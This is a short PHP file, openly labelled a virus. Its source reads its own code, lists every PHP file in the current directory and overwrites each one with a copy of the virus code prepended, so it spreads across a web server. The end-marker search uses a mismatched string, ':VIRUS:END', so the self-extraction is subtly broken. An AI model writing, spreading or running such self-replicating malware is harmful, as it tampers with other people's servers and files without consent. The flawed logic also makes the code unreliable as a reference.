<?php

// VIRUS:START

function execute($virus) {

	// Get a list of all PHP files on this server that this script can edit
	$filenames = glob('*.php');

	// Check each file
	foreach( $filenames as $filename ) {

		// Open file
		$script = fopen($filename, "r");

		//Let's write to a new file, as opposed to reading the whole script into memory, to avoid issues with larger files
		$infected = fopen("$filename.infected", "w");

		$infection = '<?php ' . $virus .' ?>';

		fputs($infected, $infection, strlen($infection));

		while( $contents = fgets($script) ) {
			fputs($infected, $contents, strlen($contents));
		}

		// Close both handles, and move the infected file to one in place
		fclose($script);
		fclose($infected);
		unlink("$filename");
		rename("$filename.infected", $filename);
	}
}

$virus = file_get_contents(__FILE__);
$virus = substr($virus, strpos($virus, "// VIRUS:START"));
$virus = substr($virus, 0, strpos($virus, "\n// :VIRUS:END") + strlen("\n// VIRUS:END"));
execute($virus);

// VIRUS:END



